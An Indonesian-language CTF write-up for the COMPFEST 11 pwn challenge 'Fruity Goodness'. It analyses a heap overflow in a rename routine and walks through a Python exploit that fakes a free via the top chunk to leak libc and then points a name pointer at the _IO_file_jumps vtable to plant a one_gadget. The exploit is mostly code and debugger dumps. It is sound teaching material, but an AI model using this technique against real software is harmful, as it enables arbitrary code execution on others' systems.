+++
title = 'COMPFEST 11 Final - Fruity Goodness'
date = '2019-09-09T00:00:00+07:00'
tags = ['ctf-writeup', 'pwn']
draft = false
+++

> hanya soal ini yang saya selesaikan selama ctf berlangsung, sad af.

# analisa

    ==================================================
    WELCOME TO FRUIT WAR v6.9
    I'm still a noob C coder :(, please report any bugs you find
    I'm also poor so i cant pay you :(
    Hopefully you have fun!
    ==================================================
    1. I want a new fruit
    2. I want to train my fruit
    3. I want to list all my fruits
    4. I want out :(
    Your choice:

Soal heap dengan fungsi `view()`, `add()`, dan `edit()`, tanpa free/`delete()`. Struktur dari `fruit`,

```c
struct fruit {
    int coolness;
    int tastiness;
    int number;
    char* name;
    struct fruit *next_fruit;
    int level;
}
```

Ada sedikit twist pada bagian `edit()` (menu train pada soal), dimana hanya bisa mengubah nama `fruit` ketika `fruit` coolneess dan tastiness lebih dari 50. Untuk menaikkan nilai coolneess dan tastiness ini, `fruit` perlu ditrain terlebih dahulu dengan pertambahan nilai yang random.

```c
fruit_to_train->coolness += rand() % 10 + 1;
fruit_to_train->tastiness += rand() % 10 + 1;
...
if ( fruit_to_train->coolness <= 49 || fruit_to_train->tastiness <= 49 ) {
    puts("Fruit Trained!");
}
```

Bug terletak pada bagian `edit()`, karena dapat mengubah nama `fruit` tanpa ada batasan panjang yang sesuai pada pembuatan pertamanya.

```c
puts("Would you like to rename this fruit? (y/n)");
fgets(choice, 5, stdin);
if ( strchr(choice, 'y') ) {
    puts("How long do you want this fruit's name to be? (Max 4096 characters)");
    scanf("%d", &length);
    getchar();
    if ( length > 4096 ) {
puts("NO! BAD!");
exit(-1);
    }
    fruit_number = alloca(16 * ((length + 15LL) / 0x10uLL));
    p_new_name = (char (*)[])&fruit_number;
    puts("What do you want this fruit's name to be?");
    read(0, p_new_name, length);
    strncpy(fruit_to_train->name, p_new_name, length);
}
```

# exploit

Berikut beberapa fungsi untuk memudahkan interaksi dengan soal,

```py
def add(length, name):
    r.sendlineafter('choice:\n', '1')
    r.sendlineafter(')\n', str(length))
    r.sendlineafter('?\n', name)

def train(idx, length, name):
    r.sendlineafter('choice:\n', '2')
    r.sendlineafter('train?\n', str(idx))
    cond = 'Trained!' in r.recvline(0)
    while cond:
r.sendlineafter('choice:\n', '2')
r.sendlineafter('train?\n', str(idx))
tmp = r.recvline(0)
cond = 'Trained!' in tmp
    r.sendlineafter(')\n', 'y')
    r.sendlineafter(')\n', str(length))
    r.sendlineafter('?\n', name)

def view():
    r.sendlineafter('choice:\n', '3')
    dump = []
    while '1. I want a new fruit' not in r.recvline(0):
c = []
tmp = r.recvline(0)
while '========================================' not in tmp:
    c.append(tmp.split(': '))
    tmp = r.recvline(0)
dump.append(c)
    return dump
```

Ide pertamanya adalah mendapatkan leak libc dengan unsorted bin free list. Iya, walaupun gak ada `free()` di soal, free ini bisa didapat dengan mengalokasi chunk yang lebih besar daripada top chunk, cek lebih lanjut di stage 1 [house of orange](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c). btw, karena ada batasan malloc sebesar 0x1000, ubah dulu top chunk size jadi dibawah 0x1000.

```py
add(0x48, 'A' * 0x47)
add(0x18, 'B' * 0x17)

#  pwndbg> dq *(long*)$rebase(&first_fruit) 40
# 0000555555559260     0000000000000000 0000000000000000
# 0000555555559270     0000555555559290 00005555555592e0
# 0000555555559280     0000000000000000 0000000000000051
# 0000555555559290     4141414141414141 4141414141414141
# 00005555555592a0     4141414141414141 4141414141414141
# 00005555555592b0     4141414141414141 4141414141414141
# 00005555555592c0     4141414141414141 4141414141414141
# 00005555555592d0     0041414141414141 0000000000000031
# 00005555555592e0     0000000000000000 0000000000000001
# 00005555555592f0     0000555555559310 0000000000000000
# 0000555555559300     0000000000000000 0000000000000021
# 0000555555559310     4242424242424242 4242424242424242
# 0000555555559320     0042424242424242 0000000000020ce1 <--- top chunk 0x20ce1

payload  = 'B' * 0x18
payload += '\xe1\x0c\x00' # 0xce1
train(1, len(payload), payload)

# pwndbg> dq *(long*)$rebase(&first_fruit) 40
# ...
# 00005555555592f0     0000555555559310 0000000000000000
# 0000555555559300     0000000000000001 0000000000000021
# 0000555555559310     4242424242424242 4242424242424242
# 0000555555559320     4242424242424242 0000000000000ce1 <--- top chunk 0x20ce1
```

Seharusnya alokasi malloc dengan ukuran lebih dari 0xce0, akan membuat heap pada page baru dan top chunk sebelumnya akan di free dan masuk ke unsorted bin.

```py
add(0xcf8, 'C')
# pwndbg> dq *(long*)$rebase(&first_fruit) 40
# ...
# 00005555555592f0     0000555555559310 0000555555559330
# 0000555555559300     0000000000000001 0000000000000021
# 0000555555559310     4242424242424242 4242424242424242
# 0000555555559320     4242424242424242 0000000000000031
# 0000555555559330     0000000000000000 0000000000000002
# 0000555555559340     000055555557a010 0000000000000000
# 0000555555559350     0000000000000000 0000000000000c91
# 0000555555559360     000015555551cca0 000015555551cca0 <--- libc leak
```

untuk dapetin leak-nya ubah `fruit->name` ke `...360`. `fruit->name` di entri ke 1 sudah menunjuk ke `...310` jadi yang perlu diubah hanya LSB-nya saja dari `0x10` jadi `0x60`.

```py
payload  = 'A' * 0x60
payload += '\x60'
train(0, len(payload), payload)

# pwndbg> dq *(long*)$rebase(&first_fruit) 40
# ...
# 00005555555592d0     4141414141414141 4141414141414141
# 00005555555592e0     4141414141414141 4141414141414141
# 00005555555592f0     0000555555559360 0000555555559330
# 0000555555559300     0000000000000001 0000000000000021
# 0000555555559310     4242424242424242 4242424242424242
# 0000555555559320     4242424242424242 0000000000000031
# 0000555555559330     0000000000000000 0000000000000002
# 0000555555559340     000055555557a010 0000000000000000
# 0000555555559350     0000000000000000 0000000000000c91
# 0000555555559360     000015555551cca0 000015555551cca0
# 0000555555559370     0000000000000000 0000000000000000

leak = view()
leak = leak[1][1][1][:6]
leak = u64(leak.ljust(8, '\x00'))

libc.address = leak - 0x1e4ca0
print 'libc', hex(libc.address)
```

Karena sudah mendapatkan leak libc, seharusnya sudah lebih mudah karena yang perlu dilakukan hanya mengubah `fruit->next_fruit->name` ke salah satu hook atau vtable di libc. Setelah itu tinggal ubah(`edit()`) nama di `fruit->next_fruit` jadi `one_gadget`. Pada exploit ini, saya menggunakan vtable dari std I/O, `_IO_file_jump`.

```py
payload  = 'A' * 0x60
payload += p64(libc.address + 0x1e65d8) # _IO_file_jump
train(0, len(payload), payload)

payload  = 'A' * 0x58
payload += p64(1)
train(0, len(payload), payload) # fix fruit->next_fruit->number

payload  = p64(libc.address + 0x106ef8) # one_gadget
```

profit.

# the real challenge dan sedikit rant

Soal ini terlihat mudah pada awalnya, tapi saya terjebak pada tahap akhir untuk mencari function pointer yang dapat dioverwrite pada libc. Teknik _spray n pray_ disini juga ga bisa digunakan karena saat `edit()`, `read()` tidak langsung ke `fruit->name`, tapi lewat value di stack terlebih dahulu lalu `strncpy()` setelahnya ke heap. `strncpy` ini akan men-copy null terminated string dari src ke dst. plus, Pointer x86_64 selalu memiliki null dan itulah sebabnya kenapa tidak bisa spray one_gadget di libc.

read(0, p_new_name, length);
strncpy(fruit_to_train->name, p_new_name, length);

btw, saya baru ingat kalau vtable std I/O, `_IO_file_jump` ini writeable setelah membaca salah satu writeup dari bushwhackers - [TokyoWesterns CTF 2019 - printf](https://blog.bushwhackers.ru/tokyo2019-printf/), tapi sayangnya ini baru teringat pas 10 menit menjelang selesai.

Lepas dari masalah mencari pointer yang bisa dioverwrite, _the real challenge_ sebenarnya adalah membuat exploit ini lebih cepat karena `usleep` yang lumayan lama saat setiap kali `edit()`. Ini sebenarnya lebih mengganggu menurut saya karena terbukti selama 5 menit terakhir saya hanya mendapatkan 2 flag dari lawan, plus, instance pada soal ini yang hidup hanya beberapa dari semua tim (tidak ada waktu untuk lapor ke panitia >.<). btw, mungkin ini lebih kepada saran kepada para challenge designer kedepannya, kalau memang tidak menyangkut bagaimana soal ini dapat diselesaikan, lebih baik tidak ditambahkan kalau bisa :). Bukan menyalahkan penggunaan `usleep` disini karena untuk soal jeopardy yang bisa fire and forget, time limit bisa tidak perlu dipedulikan, tapi untuk attack defense yang menyangkut dengan tick dsb… ¯\\\_(ツ)\_/¯